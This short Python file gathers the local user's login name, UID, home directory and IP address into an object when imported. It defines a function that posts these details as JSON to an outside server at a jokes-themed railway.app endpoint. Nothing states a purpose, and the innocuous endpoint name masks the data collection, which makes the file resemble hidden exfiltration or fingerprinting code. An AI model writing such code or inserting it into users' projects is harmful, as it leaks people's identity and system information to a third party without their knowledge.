import os
import socket
import random
import requests
from utilities.ip_addr import get_ip

class User:
  def __init__(selfuser, name, id, home_dir, ip_address):
    selfuser.name = name
    selfuser.id = id
    selfuser.home_dir = home_dir
    selfuser.ip_address = ip_address

local_user = User(os.getlogin(), os.getuid(), os.path.expanduser('~'), get_ip())

def send_data(local_user):
    # Send data to the server
    data = {
        "user_id": local_user.id,
        "user_name": local_user.name,
        "home_dir": local_user.home_dir,
        "ip_address": local_user.ip_address
    }

    response = requests.post("https://jokes.up.railway.app/crack_some_jokes", json=data)
    # print(response.status_code)
    # print(response.text)
# Send data to the server

